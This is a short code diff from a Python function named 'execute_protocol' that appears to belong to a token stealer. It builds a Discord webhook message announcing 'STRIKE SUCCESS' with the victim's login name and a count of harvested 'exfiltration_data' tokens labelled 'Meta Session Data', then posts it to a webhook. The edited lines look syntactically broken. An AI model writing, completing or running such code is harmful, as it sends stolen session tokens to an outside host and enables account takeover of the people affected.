@@ -91,8 +91,8 @@ def execute_protocol():
                 "content": f"**STRIKE SUCCESS**\nUser: {os.getlogin()}\nFound: {len(exfiltration_data)} tokens",
                 "embeds": [{
                     "title": "Meta Session Data",
-                    "description": f"
-            "color": 3447003
+                    "description": f",
+                    "color": 3447003
                 }]
             }
             requests.post(DISCORD_WEBHOOK, json=payload)
